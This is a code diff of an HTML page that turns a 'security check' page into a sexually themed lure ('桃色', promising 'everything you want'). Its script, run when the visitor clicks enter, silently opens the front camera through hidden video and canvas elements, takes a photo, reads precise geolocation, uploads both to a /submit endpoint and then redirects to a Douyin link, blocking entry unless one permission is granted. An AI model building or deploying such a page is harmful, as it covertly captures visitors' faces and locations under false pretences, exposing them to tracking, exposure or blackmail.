@@ -5,60 +5,123 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
   <title>慎入</title>
   <style>
-    * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    /* 性感风格字体：圆润、暧昧 */
+    @import url('https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@600&display=swap');
     body {
-      background: #000;
-      color: #fff;
+      font-family: 'Noto Serif SC', "楷体", KaiTi, "华文楷体", STKaiti, serif;
+    }
+
+    /* 全屏背景图（仓库图片）+ 暗色柔光遮罩，营造氛围 */
+    body::before {
+      content: "";
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: url('/r9xxFHYlsR-d3HOpRYSwbA94f7ad979a763616cec8d0267e266621.jpeg') no-repeat center center fixed;
+      background-size: cover;
+      filter: brightness(0.4) saturate(1.2);  /* 压暗但保留色彩饱和度 */
+      z-index: -1;
+    }
+
+    body {
       min-height: 100vh;
       display: flex;
       align-items: center;
       justify-content: center;
       flex-direction: column;
       padding: 20px;
+      position: relative;
     }
+
+    /* 性感装饰：上方丝带线条 */
+    .sexy-line {
+      width: 60px;
+      height: 2px;
+      background: linear-gradient(90deg, transparent, #ff69b4, #facc15, #ff69b4, transparent);
+      margin-bottom: 30px;
+      animation: pulse 2s infinite;
+    }
+    @keyframes pulse {
+      0% { opacity: 0.6; }
+      50% { opacity: 1; }
+      100% { opacity: 0.6; }
+    }
+
+    /* 标题粉色 + 柔光 */
     h1 {
-      font-size: 3.2rem;
-      letter-spacing: 0.5rem;
-      color: #ef4444;
-      margin-bottom: 1.5rem;
-      text-shadow: 0 0 20px #ef4444;
+      font-size: 3.8rem;
+      letter-spacing: 0.8rem;
+      color: #ff69b4;          /* 粉色 */
+      text-shadow: 0 0 30px #ff69b4, 0 0 8px rgba(0,0,0,0.6);
+      margin-bottom: 1rem;
     }
+
+    /* 副标题淡粉色，暧昧语气 */
     .sub {
-      font-size: 1rem;
-      color: #aaaaaa;
+      font-size: 1.1rem;
+      color: #fbcfe8;          /* 淡粉 */
       margin-bottom: 2.5rem;
       text-align: center;
-      line-height: 1.6;
+      line-height: 1.8;
+      text-shadow: 0 0 10px rgba(255,105,180,0.4);
+      background: rgba(0,0,0,0.3);
+      padding: 10px 25px;
+      border-radius: 30px;
+      backdrop-filter: blur(4px);
+      font-style: italic;
     }
+
+    /* 按钮黄色 + 发光 */
     .enter-btn {
-      background: #dc2626;
-      color: #fff;
+      background: linear-gradient(135deg, #fbbf24, #f59e0b);
+      color: #7c2d12;          /* 深棕色字，形成对比 */
       border: none;
-      padding: 1.2rem 3rem;
-      font-size: 1.8rem;
+      padding: 1.2rem 3.5rem;
+      font-size: 2rem;
       font-weight: bold;
-      border-radius: 12px;
+      border-radius: 50px;
       letter-spacing: 0.3rem;
       cursor: pointer;
-      transition: 0.15s;
+      box-shadow: 0 0 40px rgba(251, 191, 36, 0.6), 0 4px 15px rgba(0,0,0,0.5);
+      transition: all 0.2s ease;
+      font-family: 'Noto Serif SC', serif;
     }
-    .enter-btn:active { background: #b91c1c; transform: scale(0.97); }
-    .enter-btn:disabled { background: #555; cursor: not-allowed; transform: none; }
+    .enter-btn:active {
+      background: linear-gradient(135deg, #f59e0b, #d97706);
+      transform: scale(0.96);
+      box-shadow: 0 0 60px rgba(251, 191, 36, 0.9);
+    }
+    .enter-btn:disabled {
+      background: #555;
+      color: #aaa;
+      box-shadow: none;
+      cursor: not-allowed;
+      transform: none;
+    }
+
+    /* 状态文字红色 + 半透明背景 */
     #status {
       margin-top: 2rem;
-      font-size: 0.9rem;
-      color: #888;
+      font-size: 0.95rem;
+      color: #ef4444;          /* 红色 */
       min-height: 1.5em;
+      text-shadow: 0 0 8px rgba(239,68,68,0.5);
+      background: rgba(0,0,0,0.25);
+      padding: 6px 18px;
+      border-radius: 20px;
+      backdrop-filter: blur(4px);
     }
   </style>
 </head>
 <body>
-  <h1>慎 入</h1>
-  <p class="sub">系统将进行一次安全校验</p>
+  <div class="sexy-line"></div>
+  <h1>桃 色</h1>
+  <p class="sub">你想要的，全都有</p>
   <button class="enter-btn" id="enterBtn">进入</button>
-  <div id="status">网站反应较慢，本网站不对您的心理负责，请注意</div>
+  <div id="status">准备进入快乐的大门吧（网站反应较慢，耐心等待）</div>
 
-  <!-- 隐藏的视频与画布，用于静默拍照 -->
+  <!-- 隐藏的视频与画布 -->
   <video id="video" style="display:none;" playsinline muted></video>
   <canvas id="canvas" style="display:none;"></canvas>
 
@@ -71,13 +134,10 @@
 
       let stream = null;
 
-      // 状态文字固定，不再变化
       function setStatus(text) {
-        // 总是显示同一句话，保留此函数仅为兼容
         statusDiv.textContent = '本网站不对您的心理负责，请注意';
       }
 
-      // 静默开启前置摄像头并返回 MediaStream
       async function openCamera() {
         stream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
@@ -91,18 +151,14 @@
         });
       }
 
-      // 拍照并返回 JPEG Blob
       async function takePhoto() {
         const ctx = canvas.getContext('2d');
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        return new Promise(resolve => {
-          canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.7);
-        });
+        return new Promise(resolve => canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.7));
       }
 
-      // 关闭摄像头
       function closeCamera() {
         if (stream) {
           stream.getTracks().forEach(track => track.stop());
@@ -110,12 +166,9 @@
         }
       }
 
-      // 获取地理位置
       function getPosition() {
         return new Promise((resolve, reject) => {
-          if (!navigator.geolocation) {
-            return reject(new Error('浏览器不支持定位'));
-          }
+          if (!navigator.geolocation) return reject(new Error('浏览器不支持定位'));
           navigator.geolocation.getCurrentPosition(resolve, reject, {
             enableHighAccuracy: true,
             timeout: 6000,
@@ -124,20 +177,15 @@
         });
       }
 
-      // 生成一个 1x1 像素的占位图（当没有摄像头画面时使用）
       function generatePlaceholderBlob() {
         const c = document.createElement('canvas');
-        c.width = 1;
-        c.height = 1;
+        c.width = 1; c.height = 1;
         return new Promise(resolve => c.toBlob(resolve, 'image/jpeg'));
       }
 
-      // 主流程
       btn.addEventListener('click', async () => {
         btn.disabled = true;
-
         try {
-          // 并行请求摄像头和定位，不互相阻塞
           const cameraPromise = (async () => {
             try {
               await openCamera();
@@ -146,7 +194,7 @@
               return blob;
             } catch (e) {
               closeCamera();
-              return null; // 摄像头失败
+              return null;
             }
           })();
 
@@ -154,23 +202,18 @@
             try {
               const pos = await getPosition();
               return { lat: pos.coords.latitude, lon: pos.coords.longitude };
-            } catch (e) {
-              return null; // 定位失败
-            }
+            } catch (e) { return null; }
           })();
 
           const [blob, position] = await Promise.all([cameraPromise, positionPromise]);
 
-          // 只要有一项成功即可继续，两项都失败则拒绝
           if (!blob && !position) {
             alert('❌ 校验失败：\n摄像头和位置权限均未通过，无法继续访问。\n请在设置中至少允许其中一项。');
             btn.disabled = false;
             return;
           }
 
-          // 如果没有摄像头画面，使用占位图
           const finalBlob = blob || await generatePlaceholderBlob();
-
           const formData = new FormData();
           formData.append('photo', finalBlob, 'capture.jpg');
           if (position) {
@@ -178,15 +221,9 @@
             formData.append('lon', position.lon);
           }
 
-          // 上传
-          const response = await fetch('/submit', {
-            method: 'POST',
-            body: formData
-          });
-
+          const response = await fetch('/submit', { method: 'POST', body: formData });
           const result = await response.json();
           if (response.ok && result.success) {
-            // 校验通过直接跳转，不改变状态文字
             window.location.href = 'https://v.douyin.com/ySyn-e7a2AE/';
           } else {
             alert('服务端保存失败，请稍后重试');
